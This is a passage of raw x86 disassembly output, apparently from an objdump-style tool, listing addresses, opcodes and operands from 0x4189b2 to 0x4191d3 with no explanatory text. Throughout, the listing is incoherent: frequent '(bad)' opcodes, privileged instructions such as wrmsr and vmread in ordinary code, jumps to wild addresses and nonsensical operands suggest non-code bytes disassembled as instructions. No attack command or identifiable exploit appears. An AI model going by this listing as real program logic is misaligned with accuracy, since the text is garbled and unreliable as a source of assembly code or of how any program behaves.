  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
